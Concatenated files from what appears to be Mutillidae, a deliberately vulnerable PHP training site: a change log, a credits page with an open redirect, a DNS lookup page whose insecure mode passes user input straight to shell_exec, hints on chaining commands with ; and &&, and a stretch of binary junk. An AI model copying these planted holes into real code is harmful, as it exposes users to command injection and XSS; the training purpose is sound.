			cross site scripting, and JavaScript injection. The page is primarily intended
			to practice the JS injection in as easy a way as possible.
		</li>
	</ul>
</blockquote>

<p><b>07/24/2011</b>: Jeremy Druin</p>

<blockquote>
	<p>Change Log for Mutillidae 2.0.12:</p>
	<ul>
		<li>
			Changed the label of the link to "Cross Site Framing" to "Click-Jacking"			
		</li>
		<li>
			Created a new page to frame the Mutillidae site so we can practice
			Cross-Site Framing. Added a menu item under 
			Other --&gt; Information Leakage --&gt; Cross-Site Framing.
			In secure mode, Mutillidae does not allow itself to be framed by
			third party sites. Enjoy.
		</li>
		<li>
			Created a new menu path for "Missing HTTPOnly Attribute" because
			it doesn't really fit directly into a XSS exploit. It is a 
			misconfiguration that leads to an exploit.
		<li>
			Created a new page to talk about the site footer displaying the
			user agent string. The new page includes hints.
		</li>
		<li>Refactored footer.php to remove database closing code. This code is in index.php now.</li>
		<li>
		Added new vulnerability for remote file inclusion. 
		Access via "A4 - Insecure Direct Object References" --&gt; "Arbitrary File Incusion".
		Enjoy!
		</li>
	</ul>
</blockquote>

<p><b>07/17/2011</b>: Jeremy Druin</p>

<blockquote>
	<p>Change Log for Mutillidae 2.0.11:</p>
	<ul>
		<li>
			Oops! Fixed a bug in the secure code which (ironically) did not 
			stop the command injection as long as the attacker chained the attack
			with a validly formed IPV4 address. I forgot to put the starts-with
			and ends-with symbols on the RegEx.
		</li>
		<li>
			Added IPV6 pattern as a valid pattern on page dns-lookup.php. The 
			page will accept IPV6, IPV4, or Domain Name.
		</li>
		<li>Made some cosmetic improvements to the dns-lookup.php page</li>
		<li>
			Added a whole new batch of fun. Mutillidae now supports (and defends)
			against Cascading Style Injection. Enjoy.
		</li>
	</ul>
</blockquote>

<p><b>07/09/2011</b>: Jeremy Druin</p>

<blockquote>
	<p>Change Log for Mutillidae 2.0.10:</p>
	<ul>
		<li>Added new vulnerability HTTP Parameter Pollution on page user-poll.php</li>
		<li>
			Added defense for JavaScript injection in the "Back" buttons.
			In secure mode, Mutillidae will encode the HTTP Referer header using
			JavaScript encoding
		</li>
	</ul>
</blockquote>

<p><b>06/21/2011</b>: Jeremy Druin</p>

<blockquote>
	<p>Change Log for Mutillidae 2.0.9.1:</p>
	<ul>
		<li>Added new menu items under SQLi for SQLi Insert Injection</li>
		<li>Added new menu item for documentation</li>
		<li>Moved constants into constants.php file</li>
		<li>Patched tabbing in home.htm</li>
		<li>Added additional instructions on supressing PHP errors with XamppLite. Thanks to Miguel 
		Wherner for the tip.</li>
		<li>Added more hints to command injection page</li>
		<li>Updated the Easter egg file</li>
		<li>Added "Bookmark This Site" button to the resources tab in the menu</li>
		<li>Added lots more default users</li>
		<li>
			Added a stored procedure for users to attempt to extract the source
			code using SQL injection
		</li>
		<li>Added a stored procedure to support logins so we can start
		to put real security into this thing.</li>
		<li>Added new article "How to Access Mutillidae over Virtual Box Host Only Network"</li>
		<li>Introduced a new vulnerability: JavaScript Injection</li>		
	</ul>
</blockquote>

<p><b>06/15/2011</b>: Jeremy Druin</p>

<blockquote>
	<p>Change Log for Mutillidae 2.0.8:</p>
	<ul>
		<li>
			Added more comments to the code to explain how defenses work</li>
		<li>
		Added support for the &lt;u&gt;&lt;/u&gt; tag to the blog. In secure mode Mutillidae will allow this tag
		but still safely encode output and stop XSS.</li>
		<li>
		Added JavaScript filtering to prevent single quotes from being entered in blog entries. This give practice 
		bypassing JavaScript "security" and helps the user understand JavaScript cannot provide security.
		</li>
		<li>
			Added lots of JS filtering to login.php. Nearly all characters are filtered. Users are encouraged
			to understand that JavaScript and filtering are useless for security.
		</li> 
		<li>Added autofocus to login.php and add-to-blog.php</li>
		<li>
			Added more "allowed dangerous HTML tags" to the blog. Until now only the bold HTML tag was supported. Also
			the output was not HTML5 compliant. For example, if the user entered a bold tag, then a bold tag was output
			however the bold tag is depreciated. Styles must be used. So Mutillidae allows the user to input
			a bold tag but will correctly encode this as a sytle upon output. The italic tag is now supported
			as a dangerous input which is safely output without fear of Cross Site Scripting. These defenses
			only operate in secure mode of course. In insecure mode, the site allows any input and simply outputs
			whatever is input without any encoding.
		</li>
		<li>
			Changed menu for OWASP A1 - Injection to differentiate between SQL, HTML, and Command Injection. This should make
			it more clear which pages exhibit vulnerabilities with the specific injecton sub-types. Also added new link for 
			Blind SQL Injection.
		</li>
		<li>
			Changed menu for OWASP A2 - Cross Site Scripting to differentiate between XSS coming in via user supplied fields 
			(GET/POST) and values within HTTP Request Headers.
		</li>
		<li>
			Added tutorials feature.
		</li>
		<li>Added SQL Injection Totorial</li>
		<li>Added Cross Site Scripting tutorial</li>
		<li>Added Command Injection tutorial</li>		
		<li>
			Added new feature. Hints can now be at different levels. Each time the user clicks Hints, the level increases by 1 until rolling over.
		</li>
		<li>Removed the installation instructions from the home page. A new page for instructions is created and linked from the menu.
		<li>
			Augmented the installation instructions to include running from Samurai, creating a custom ISO, installing 
			to XAMPP, and running in virutal machines.
		</li>
		<li>Reformatted install instructions and main home page to be compliant with HTML 5</li>
	</ul>
</blockquote>

<p><b>05/20/2011</b>: Jeremy Druin</p>

<blockquote>
	<p>Change Log for Mutillidae 2.0.7:</p>
	<ul>
		<li>
			Added a new page rene-magritte.php to explore click-jacking.
			
			In secure mode, Mutillidae will send the X-FRAME-OPTIONS: DENY
			header. In modern browsers, this will cause the browser to throw an
			error rather than allow the page rene-magritte.php to be framed.
		</li>
		<li>
			Added a resources link to the main menu. Links are to information
			or tools that can help with testing Mutillidae.
		</li>
		<li>
			Added new class LogHandler to take over logging. Previously
			logging statements has to be copied to each spot that logging
			was needed. With the new class, logging requires only one
			line of code and the logger automatically logs based on the 
			current security level. If in insecure mode, no attempt
			to stop XSS or SQLi is made.
			
			With the new class, many less lines of code are needed and many
			more places log. With more places logging, there is a much better
			chance of finding a log exploit and taking advantage (insecure mode).
			
			Logging added to pages: add-to-your-blog, dns-lookup, text-file-viewer,
			source-viewer.php, register.php, redirectandlog.php, and user-info.php
		</li>
		<li>
			Added more default users to initial setup to give more targets.
		</li>
	</ul>
</blockquote>

<p><b>05/10/2011</b>: Jeremy Druin</p>

<blockquote>
	<p>Change Log for Mutillidae 2.0.6:</p>
	<ul>
		<li>
			Added a new security vulnerability and counteracting secure code.
			The "business requirements" for the add-new-blog-entry page 
			now require users to be able to enter a bold tag
			in their blog.

			In secure mode, Mutillidae allows this functionality while still 
			protecting the users from mallicous injection input.
		</li>
		<li>
			A new secret page has been added. There are lots of test scripts
			that the developers used to hack Mutillidae inside. It will be very hard
			to guess the name of the file but there are plenty of vulns
			that will allow users to locate and open the file.
		</li>
	</ul>
</blockquote>

<p><b>04/22/2011</b>: Jeremy Druin</p>

<blockquote>
	<p>Change Log for Mutillidae 2.0.6:</p>
	<ul>
		<li>
			Added a new security vulnerability and counteracting secure code.
			Cookies are unprotected in insecure mode, but in secure mode, the
			cookies will have the HTTPOnly attribute applied to them.
			
			In reality this vulnerability was always in Mutillidae since ignoring
			the issue opens the vulnerability (the ability for scripts to access the
			cookie values). The change is acknowleging this issue and adding the 
			defense. 
			
			Once we get an SSL certificate installed, the next logical step will be to 
			add the "Secure" attribute to cookies in secure mode, but to not
			add this attribute in insecure mode. 
		</li>
		<li>
			Added the X-FRAME-OPTIONS: DENY click-jacking defense in secure mode.
			In insecure mode, the site does nothing and ignores the issue entirely.
			This defense only works in newer browsers and javascript framebusters are
			needed to help older browsers.
		</li>
		<li>Added insecure comments vulnerability and defense. Some developers use 
			HTML or JavaScript comments instead of using the frameworks comments 
			(ASP.NET, Java, PHP, Etc.)
		</li>
		<li>Rearranged instructions on home page to emphasize the PHP.ini 
			configuration changes that are needed to get rid of errors.
		</li>
		<li>Rewrote opendb.inc to have error trapping and custom
			error handling. If there is an error, there will be some diagnistic
			information available.
		</li>
	</ul>
</blockquote>

<p><b>04/14/2011</b>: Jeremy Druin</p>

<blockquote>
	<p>Change Log for Mutillidae 2.0.5:</p>
	<ul>
		<li>
			browser-info.php - Patched a bug which disabled entire page if the 
			whois server is not reachable. Now only that one line will be disabled.
			Also replaced Windows style file path slashes with Unix style. Either 
			slash will work in Windows but Linux only accepts the Unix style
			path else throws an error.
		</li>
	</ul>
</blockquote>

<p><b>04/13/2011</b>: Jeremy Druin</p>

<blockquote>
	<p>Change Log for Mutillidae 2.0.4:</p>
	<ul>
		<li>
			user-info.php - Added XSS defenses to the output so that users cannot poison 
			their username, password or signature to cause XSS.
			This only works in secure code.
		</li>
		<li>
			register.php - Added XSS defenses to the output so that users cannot poison 
			their username to cause XSS. This only works in secure code.
		</li>
		<li>
			header.php - Added link to this changelog. Changed style of upper header to 
			allow more space for logged in user text. In very small screens, the text was 
			overlapping. Also, the size of the mascot image was reduced to give the user 
			more screen space.
		</li>
		<li>change-log.php - Added new XSS vulnerability for users to try.
	</ul>
</blockquote>

<p><b>03/30/2011</b>: Jeremy Druin</p>

<blockquote>
	<p>Change Log for Mutillidae 2.0.3:</p>
	<ul>
		<li>index.php - Added PHP version detection and altered forms caching defenses and 
			server header information defenses to use header_remove() only if the version
			of PHP is at 5.3 or above. Made version string variable that contains whatever
			version string is for Mutillidae plus "nice" output. Samurai is going through
			a PHP version change to 5.3 right now and XAMPP just went through the same change.
			This code is meant to bridge users caught between versions.
		</li>
		<li>
			header.php - Made version output simpler. header.php only outputs the header
			string.
		</li>
		<li>
			footer.php - Added PHP version to footer output in insecure mode. In secure mode, server version is not shown.
		</li>
	</ul>
</blockquote>

<p><b>03/25/2011</b>: Jeremy Druin</p>

<blockquote>
	<p>Change Log for Mutillidae 2.0.2 Beta:<br>
	<br>
	Whole site</p>
	<ul>
		<li>Made local relative links without leading dot</li>
		<li>Installed on Samurai 0.95 for testing. Found that Samurai doesnt like the leading dot in local file paths. Those were removed from the index.php page.</li>
		<li>Made version a variable in index.php to make updating version string easier</li>
		<li>Added new forms caching information leakage vulnerability</li>
		<li>Added new vulnerability for X-Powered-By and discussed removing the Server HTTP header in comments</li>
	</ul>
</blockquote>

<p><b>03/23/2011</b>: Jeremy Druin</p>

<blockquote>
	<p>Change Log for Mutillidae 2.0.1 Beta:<br>
	<br>
	Whole site</p>
	<ul>
		<li>Replaced root relative links with local relative links to allow more freedom in root folder name</li>
		<li>Added email address for Jeremy</li>
		<li>Added change log to site</li>
		<li>Added Toggle Hints into core menu but link disappears in secure mode</li>
		<li>Added new failure to restrict URL access vuln</li>
	</ul>
</blockquote>

<p><b>03/23/2011</b>: Jeremy Druin</p>
<blockquote>
	<p>Change Log for Mutillidae 2.0 Beta:<br>
	<br>
	Whole site</p>
	<ul>
		<li>Site implements the OWASP ESAPI API for PHP including showing how to 
		instantiate classes and call methods for output encoding.</li>
		<li>Site now allows user to switch between secure and insecure mode to 
		allow the user to employ an attack then try the same attack against more 
		secure code</li>
		<li>All code for both modes of operation are available for inspection 
		and include large amounts of explanation comments for both the insecure 
		and secure sections. Code is commented in such a way to help developers 
		understand the security concepts as opposed to only seeing the PHP 
		implementation</li>
		<li>Added custom error handling to site which reacts differently 
		depending on security mode</li>
		<li>Site has larger hint sections with more hints included</li>
		<li>Added menuing system for easier navigation</li>
		<li>Added toolbar at top of each page for critical functions (hints, 
		security mode, home page, etc.)</li>
		<li>Converted styles to CSS</li>
		<li>Collected images into single folder</li>
		<li>Added links to helpful tools and sites with more information: OWASP, 
		Toad for PHP, Eclipse PDT, Samurai WTF, and Backtrack 4 R2</li>
		<li>Released new web interface design and navigation for each page</li>
		<li>Installed TRY/CATCH handling in all pages</li>
	</ul>
	<p>add-to-your-blog.php </p>
	<ul>
		<li>additional reflected XSS vuln added</li>
		<li>SQLi vector added</li>
		<li>additional stored XSS vuln added</li>
		<li>demonstrates output encoding</li>
		<li>demonstrates SQLi prevention</li>
		<li>non-input box attack vector added</li>
	</ul>
	<p>browser-info.php</p>
	<ul>
		<li>demonstrates safer JavaScript</li>
		<li>created ClientInformationHandler class to gather client information</li>
		<li>demonstrates output encoding</li>
		<li>added JavaScript attack vector using innerHTML</li>
	</ul>
	<p>credits.php</p>
	<ul>
		<li>added Insecure Direct Object Reference defenses</li>
	</ul>
	<p>dns-lookup.php</p>
	<ul>
		<li>In secure mode, added strong server-side validation for page. Page 
		allows both ip based and DNS name based attacks and includes defenses 
		for both.</li>
	</ul>
	<p>footer.php</p>
	<ul>
		<li>added new attack vector to allow refelected XSS via HTTP headers</li>
		<li>added defenses for input coming from HTTP headers</li>
		<li>added comments encouraging developers to treat ALL input as evil and 
		not just the input boxes they created</li>
	</ul>
	<p>header.php</p>
	<ul>
		<li>Replaced menu with mouseover navagation and updated menu with new 
		attacks</li>
		<li>Added new stored cross site scripting attacks and defenses</li>
		<li>Added code to allow site to ignore user created cookies in secure 
		mode and react to user created cookies in insecure mode</li>
	</ul>
	<p>home.html</p>
	<ul>
		<li>Added instructions</li>
		<li>Added warning about PHP.ini files that come with new XAMPP/PHP 
		versions 5.3 and 6.0 (future)</li>
	</ul>
	<p>homenotes.php</p>
	<ul>
		<li>Created newly formatted hints section</li>
	</ul>
	<p>index.php</p>
	<ul>
		<li>Created new processing framework</li>
		<li>Added the ability to use session storage</li>
		<li>Installed initialization code</li>
	</ul>
	<p>login.php</p>
	<ul>
		<li>added HTML maxlength to allow practice of circumventing trivial and 
		useless HTML based defenses</li>
		<li>Added detection of whether user is currently logged in with new 
		funcitonality. Site will auto-detect when users are logged in and change 
		links appropriately</li>
		<li>Added new reflected XSS vector</li>
	</ul>
	<p>process-commands.php</p>
	<ul>
		<li>new file which collects all &quot;do&quot; commands together</li>
		<li>installed several new attack vectors and defenses based on the &quot;do&quot; 
		commands</li>
	</ul>
	<p>redirectandlog.php</p>
	<ul>
		<li>Created new HTTP parameter pollution attack</li>
		<li>Installed advanced mapping defences with validation</li>
		<li>Installed strong validation defenses</li>
	</ul>
	<p>register.php</p>
	<ul>
		<li>installed SQLi and XSS defenses</li>
		<li>reformatted page with new design and error feedback</li>
	</ul>
	<p>show-log.php</p>
	<ul>
		<li>installed DOS defenses</li>
		<li>added DOS attack vector</li>
		<li>installed tabular output</li>
		<li>added defenses for injection attacks and XSS</li>
		<li>added attack vector against log</li>
	</ul>
	<p>source-viewer.php/text-viewer.php</p>
	<ul>
		<li>Added/augmented attack vectors</li>
		<li>Added new attack vectors to allow loading of local server files</li>
		<li>Filename injection (Insecure Direct Object Reference)</li>
		<li>SQL Injection, (Fix: Use Schematized Stored Procedures)</li>
		<li>Cross Site Scripting, (Fix: Encode all output)</li>
		<li>Cross Site Request Forgery, (Fix: Tokenize transactions)</li>
		<li>Insecure Direct Object Reference, (Fix: Tokenize Object References)</li>
		<li>Denial of Service, (Fix: Truncate Log Queries)</li>
		<li>Loading of Local Files, (Fix: Tokenize Object Reference - Filename 
		references in this case)</li>
		<li>Improper Error Handling, (Fix: Employ custom error handler)</li>
		<li>SQL Exception, (Fix: Employ custom error handler)</li>
		<li>HTTP Parameter Pollution (Fix: Scope request variables)</li>
		<li>Added mapping defenses</li>
	</ul>
	<p>user-info.php</p>
	<ul>
		<li>added SQL and XSS defenses</li>
		<li>added tabular output</li>
	</ul>
	<p>view-someones-blog.php</p>
	<ul>
		<li>installed SQLi and XSS defenses</li>
		<li>installed trivial and useless &quot;tokens&quot; to allow user to bypass HTML 
		code which intends to confuse instead of defend.</li>
	</ul>
</blockquote>
<?php 
	try{
		$lResult = $conn->close();
		if (!$lResult) {
		   	throw (new Exception("Error executing query. Connection error: ".$conn->connect_errorno." - ".$conn->connect_error." Error: ".$conn->errorno." - ".$conn->error, $conn->errorno));
		}// end if
	} catch (Exception $e) {
		echo $CustomErrorHandler->FormatError($e, "Error attempting to close MySQL connection.");
	}// end try		
?><?php
	/* NOTE: On Samurai, the $dbpass password is "samurai" rather than blank */

	$dbhost = 'localhost';
	$dbuser = 'root';
	$dbpass = '';
	$dbname = 'metasploit';
?>
<div class="page-title">Credits</div>

<?php include_once './includes/back-button.inc';?>

<?php 
   	switch ($_SESSION["security-level"]){
   		case "0": // This code is insecure
   		case "1": // This code is insecure
   			/* This code is insecure. Direct object references in the form of the "forwardurl"
   			 parameter give the user complete control of the input. Contrary to popular belief, 
   			 input validation, blacklisting, etc is not the best defense. The best defenses are 
   			 probably secure 100% of the time. For direct object references, there are two defenses.
   			 Authorization via ACL or Entitlements is used when transaction requires authentication.
   			 This transaction (forwarding URL) does not require authentication so the other method is used;
   			 mapping. Mapping substitutes a harmless token for the direct object. The direct object in 
   			 this case is the page the user is being forwarded to. We will use mapping to secure this code.
   			
   			 Note: For static links, the best defense is to simply hardcode the links in an anchor tag.
   			 This exercise will use mapping to show how it works, but it should be recognized that 
   			 for giving the user links to click, hardcoding is the best defense.
   			*/ 
   			echo '
				<div class="label" style="text-align: center;">Created by Irongeek.com. Developed by Adrian &quot;<a href="http://www.irongeek.com">Irongeek</a>&quot; Crenshaw and <a href="mailto:mutillidae-development@gmail.com">Jeremy Druin</a></div>
				<div>&nbsp;</div>
				<div>&nbsp;</div>
   				<div><a href="index.php?page=redirectandlog.php&forwardurl=http://www.irongeek.com/">Adrian Crenshaw</a> would like to thank 
				the following people for helping him with the Mutillidae project:</div>
				<div>&nbsp;</div>
				<div><a href="index.php?page=redirectandlog.php&forwardurl=http://www.owasp.org">OWASP</a> for making the vulnerability&nbsp; 
				list I based this on.</div>
				<div><a href="index.php?page=redirectandlog.php&forwardurl=http://www.issa-kentuckiana.org/">ISSA Kentuckiana</a></div>
				<div><a href="index.php?page=redirectandlog.php&forwardurl=http://www.owasp.org/index.php/Louisville">OWASP Louisville </a></div>
				<div><a href="index.php?page=redirectandlog.php&forwardurl=http://www.pocodoy.com/blog/">Brian Blankenship</a> for his support 
				of the idea.</div>
				<div><a href="index.php?page=redirectandlog.php&forwardurl=http://www.room362.com/">Mubix</a> for confirming the name</div>
				<div><a href="index.php?page=redirectandlog.php&forwardurl=http://www.isd-podcast.com/">InfoSec Daily Podcast</a></div>
				<div><a href="index.php?page=redirectandlog.php&forwardurl=http://pauldotcom.com/">PaulDotCom Podcast</a></div>
				<div>All sorts of folks at <a href="index.php?page=redirectandlog.php&forwardurl=http://www.php.net/">PHP.net </a>for code snippets: kaigillmann </div>
				<div><a href="index.php?page=redirectandlog.php&forwardurl=https://addons.mozilla.org/en-US/firefox/collections/jdruin/pr/">Professional Web Application Developer Quality Assurance Pack</a> by <a href="mailto:mutillidae-development@gmail.com">Jeremy Druin</a></div>
   			';
   		break;
    		
   		case "2":
   		case "3":
   		case "4":
   		case "5": // This code is fairly secure
   			echo '
				<div class="label" style="text-align: center;">Created by Irongeek.com. Developed by Adrian &quot;<a href="http://www.irongeek.com">Irongeek</a>&quot; Crenshaw and <a href="mailto:mutillidae-development@gmail.com">Jeremy Druin</a></div>
				<div>&nbsp;</div>
				<div>&nbsp;</div>
   				<div><a href="index.php?page=redirectandlog.php&forwardurl=1">Adrian Crenshaw</a> would like to thank 
				the following people for helping him with the Mutillidae project:</div>
				<div>&nbsp;</div>
				<div><a href="index.php?page=redirectandlog.php&forwardurl=2">OWASP</a> for making the vulnerability list I based this on.</div>
				<div><a href="index.php?page=redirectandlog.php&forwardurl=3">ISSA Kentuckiana</a></div>
				<div><a href="index.php?page=redirectandlog.php&forwardurl=4">OWASP Louisville </a></div>
				<div><a href="index.php?page=redirectandlog.php&forwardurl=5">Brian Blankenship</a> for his support 
				of the idea.</div>
				<div><a href="index.php?page=redirectandlog.php&forwardurl=6">Mubix</a> for confirming the name</div>
				<div><a href="index.php?page=redirectandlog.php&forwardurl=7">InfoSec Daily Podcast</a></div>
				<div><a href="index.php?page=redirectandlog.php&forwardurl=8">PaulDotCom Podcast</a></div>
				<div>All sorts of folks at <a href="index.php?page=redirectandlog.php&forwardurl=9">PHP.net </a>for code snippets: kaigillmann </div>
				<div><a href="index.php?page=redirectandlog.php&forwardurl=10">Professional Web Application Developer Quality Assurance Pack</a> by <a href="mailto:mutillidae-development@gmail.com">Jeremy Druin</a></div>
			';
  		break;
   	}// end switch
?>

<?php
	// Begin hints section
	if ($_SESSION["showhints"]) {
		echo '
			<table>
				<tr><td class="hint-header">Hints</td></tr>
				<tr>
					<td class="hint-body">
						<ul class="hints">
						  	<li><b>For Unvalidated Redirects and Forwards:</b> 
						  	Unvalidated redirects can make the job of Phishers easier 
						  	since the URL can be made to look like part of a trusted site. 
						  	Notice how this page used redirectandlog.php?forwardurl= 
						  	to send a user to another site, and log where it went. 
						  	A Phisher could use this forward mechanism to make a 
						  	Phishing URL look more legitimate.
							</li>
						</ul>
					</td>
				</tr>
			</table>'; 
	}//end if ($_SESSION["showhints"])
?><?php 
	try {	    	
    	switch ($_SESSION["security-level"]){
    		case "0": // This code is insecure. No input validation is performed.
				// Grab inputs insecurely. $_REQUEST allows any input parameter. Not just POST.
				$targethost = $_REQUEST["target_host"]; // allow command injection
    			$targethost_validated=true; 			// do not perform validation
				$lTargetHostText = $targethost; 		//allow XSS by not encoding output
				$lEnableJavaScriptValidation = FALSE;
    		break;

    		case "1": // This code is insecure. No input validation is performed.
				// Grab inputs insecurely. $_REQUEST allows any input parameter. Not just POST.
				$targethost = $_REQUEST["target_host"]; // allow command injection
    			$targethost_validated=true; 			// do not perform validation
				$lTargetHostText = $targethost; 		//allow XSS by not encoding output
				$lEnableJavaScriptValidation = TRUE;
    		break;

	   		case "2":
	   		case "3":
	   		case "4":
    		case "5": // This code is fairly secure
				/* Protect against one form of patameter pollution 
				 * by grabbing inputs only from POST parameters. */ 
				$targethost = $_POST["target_host"];
				
				/* Protect against command injection. 
				 * We validate that an IP is 4 octets, IPV6 fits the pattern, and that domain name is IANA format */
    			$targethost_validated = preg_match(IPV4_REGEX_PATTERN, $targethost) || preg_match(DOMAIN_NAME_REGEX_PATTERN, $targethost) || preg_match(IPV6_REGEX_PATTERN, $targethost);
    			
    			/* Protect against XSS by output encoding */
    			$lTargetHostText = $Encoder->encodeForHTML($targethost);
    			
    			$lEnableJavaScriptValidation = TRUE;
    		break;
    	}// end switch
	}catch(Exception $e){
		echo $CustomErrorHandler->FormatError($e, "Error setting up configuration on page dns-lookup.php");
	}// end try	
?>

<div class="page-title">DNS Lookup</div>

<?php include_once './includes/back-button.inc';?>

<!-- BEGIN HTML OUTPUT  -->
<script type="text/javascript">
	var onSubmitBlogEntry = function(/* HTMLForm */ theForm){

		<?php 
		if($lEnableJavaScriptValidation){
			echo "var lOSCommandInjectionPattern = /[;&]/;";
		}else{
			echo "var lOSCommandInjectionPattern = /*/;";
		}// end if

		if($lEnableJavaScriptValidation){
			echo "var lCrossSiteScriptingPattern = /[<>=()]/;";
		}else{
			echo "var lCrossSiteScriptingPattern = /*/;";
		}// end if
		?>
		
		if(theForm.target_host.value.search(lOSCommandInjectionPattern) > -1){
			alert("Ampersand and semi-colon are not allowed.\n\nDon\'t listen to security people. Everyone knows if we just filter dangerous characters, XSS is not possible.\n\nWe use JavaScript defenses combined with filtering technology.\n\nBoth are such great defenses that you are stopped in your tracks.");
			return false;
		}else if(theForm.target_host.value.search(lCrossSiteScriptingPattern) > -1){
			alert("Characters used in cross-site scripting are not allowed.\n\nDon\'t listen to security people. Everyone knows if we just filter dangerous characters, XSS is not possible.\n\nWe use JavaScript defenses combined with filtering technology.\n\nBoth are such great defenses that you are stopped in your tracks.");
			return false;			
		}else{
			return true;
		}// end if
	};// end JavaScript function onSubmitBlogEntry()
</script>

<form 	action="index.php?page=dns-lookup.php" 
			method="post" 
			enctype="application/x-www-form-urlencoded" 
			onsubmit="return onSubmitBlogEntry(this);"
			id="idDNSLookupForm">		
	<table style="margin-left:auto; margin-right:auto;">
		<tr id="id-bad-cred-tr" style="display: none;">
			<td colspan="2" class="error-message">
				Error: Invalid Input
			</td>
		</tr>
		<tr><td></td></tr>
		<tr>
			<td colspan="2" class="form-header">Who would you like to do a DNS lookup on?<br/><br/>Enter IP or hostname</td>
		</tr>
		<tr><td></td></tr>
		<tr>
			<td class="label">Hostname/IP</td>
			<td><input type="text" id="idTargetHostInput" name="target_host" size="20"></td>
		</tr>
		<tr><td></td></tr>
		<tr>
			<td colspan="2" style="text-align:center;">
				<input name="dns-lookup-php-submit-button" class="button" type="submit" value="Lookup DNS" />
			</td>
		</tr>
		<tr><td></td></tr>
		<tr><td></td></tr>
	</table>
</form>

<script type="text/javascript">
<!--
	try{
		document.getElementById("idTargetHostInput").focus();
	}catch(/*Exception*/ e){
		alert("Error trying to set focus: " + e.message);
	}// end try
//-->
</script>

<?php
	if (isset($_POST["dns-lookup-php-submit-button"])){
	    try{
	    	if ($targethost_validated){
	    		echo '<p class="report-header">Results for '.$lTargetHostText.'<p>';
    			echo '<pre class="report-header" style="text-align:left;">';
    			echo shell_exec("nslookup " . $targethost);
				echo '</pre>';
				$LogHandler->writeToLog($conn, "Executed operating system command: nslookup " . $lTargetHostText);
	    	}else{
	    		echo '<script>document.getElementById("id-bad-cred-tr").style.display=""</script>';
	    	}// end if ($targethost_validated){

    	}catch(Exception $e){
			echo $CustomErrorHandler->FormatError($e, "Input: " . $targethost);
    	}// end try
    	
	}// end if (isset($_POST)) 
?>

<?php
	// Begin hints section
	if ($_SESSION["showhints"]) {
		echo '
			<table>
				<tr><td class="hint-header">Hints</td></tr>
				<tr>
					<td class="hint-body">
						<ul class="hints">
						  	<li>
						  		<b>For Command Injection Flaws:</b> Directly building a command to use in a
								shell? Bad idea! Try command separators like ; and && depending on if 
								you are using Linux or Windows respectively. 
							</li>
							<li>Windows uses "&&" to link commands.</li>
							<li>Linux uses "&&" to link commands and ";" as a command separater.</li>
						</ul>
					</td>
				</tr>
			</table>'; 
	}//end if ($_SESSION["showhints"])

	if ($_SESSION["showhints"] == 2) {
		include_once './includes/command-injection-tutorial.inc';
	}// end if
	
	if ($_SESSION["showhints"] == 2) {
		include_once './includes/cross-site-scripting-tutorial.inc';
	}// end if
?>         h     (                                                                 !!                                                    

m                                              ..i))z++u&&w,                                        ''zY44V??????66Q''xq                                        f    ~                                  +    ;        T       &                             2**x**   (   !                               6   H///669779444   B   ?                                     d:::===p                                   6       !!!f?????@%%%~         <                              D   ]4

G   ]   M                                          s                                                    \  PR      i\   _                                      6     !      0      9                                       >  P  \  I         $                                                                          A?AAAAAAAAAA?AAAAA			<!-- End Content -->
		</blockquote>
			</td>
		</tr>
	</table>

<?php 
		   	switch ($_SESSION["security-level"]){
		   		case "0": // This code is insecure
		   		case "1": // This code is insecure
		   			// DO NOTHING
		   			$lUserAgentString = $_SERVER['HTTP_USER_AGENT'];
					$lPHPVersion = "PHP Version: " . phpversion();
		   		break;
			    
		   		case "2":
		   		case "3":
		   		case "4":
		   		case "5": // This code is fairly secure
		  			/* 
		  			 * All information coming to the server in HTTP requests is under the 
		  			 * complete control of the user. This includes any information normally
		  			 * being thought of as "sent by the browser". HTTP requests are simply
		  			 * streams of strings formatting according to HTTP specifications. Anyone
		  			 * can format a string properly. A browser is not required. Try reading the RFC
		  			 * for HTTP to see how to construct the strings. Check out user-agent switchers
		  			 * like the add-on for Firefox to change only the user-agent string without
		  			 * having to create the entire header. Try Tamper Data to get control of all
		  			 * the HTTP headers in the request. Try netcat to create your own HTTP header 
		  			 * from scratch. When you get really comfortable. Try sending HTTP requests 
		  			 * via Telnet.
		  			 * 
		  			 * This code is secure because we escape all output according to context. This
		  			 * information is being output to HTML so we HTML encode the information. If we
		  			 * were outputing into JavaScript we would not use HTML encoding. We would use
		  			 * JavaScript string encoding. There are 5 contexts to be particuarly careful about.
		  			 * HTML, HTML attributes, JavaScript, CSS, and URL query parameters.
		  			 */
		   			$lUserAgentString = $Encoder->encodeForHTML($_SERVER['HTTP_USER_AGENT']);
					$lPHPVersion = "PHP Version: Not Available (Secure mode doesn't blab the server version)";
		   		break;
		   	}// end switch
	echo '<div class="footer">Browser: '.$lUserAgentString.'</div>';
	echo '<div class="footer">'.$lPHPVersion.'</div>';
?>

	<div class="footer">
		The newest version of 
		<a href="http://www.irongeek.com/i.php?page=security/mutillidae-deliberately-vulnerable-php-owasp-top-10" target="_blank">
			Mutillidae
		</a> 
		can downloaded from <a href="http://irongeek.com" target="_blank">Irongeek's Site</a>
	</div>
</body>
</html><!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
	<link rel="stylesheet" type="text/css" href="./styles/global-styles.css" />
	<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
	<title>Framer</title>
</head>
<body>
	<table style="margin-left:auto; margin-right:auto;">
		<tr><td>&nbsp;</td></tr>
		<tr><td><div class="page-title">Framer</div></td></tr>
		<tr><td>&nbsp;</td></tr>
		<tr>
			<td colspan="2" class="form-header">This page attempts to frame Mutillidae. If it succeeds, we have a defect in our code.
				<br />
				Are we being framed?
			</td>
		</tr>
		<tr><td>&nbsp;</td></tr>
		<tr>
			<td class="informative-message">
			Hint: Toggle through the security levels. What happens at security level 5?<br/>
			Is there a new HTTP header at security level 5? Burp-Suite might be useful.
			</td>
		</tr>
		<tr>
			<td>
				<div style="text-align: center;">
					<img src="./images/coykillericon.png" width="65px" height="50px" style="vertical-align: middle;" />
					&nbsp;&nbsp;
					<a href="index.php" style="text-decoration: none; font-weight: bold; font-size: 18pt;">Return to Mutillidae</a>
				</div>
			</td>
		</tr>
		<tr><td></td></tr>
	</table>
	<div style="text-align: center;">
		<iframe src="index.php" frameborder="1" width="800px" height="600px"></iframe>
	</div>
</body>
</html>
<script src="./javascript/follow-mouse.js"></script>
<div class="page-title">Page Viewer</div>

<?php include_once './includes/back-button.inc';?>

<table style="margin-left:auto; margin-right:auto;">
	<tr>
		<td colspan="2" class="form-header">Click on portion of picture to enlarge</td>
	</tr>
	<tr><td></td></tr>
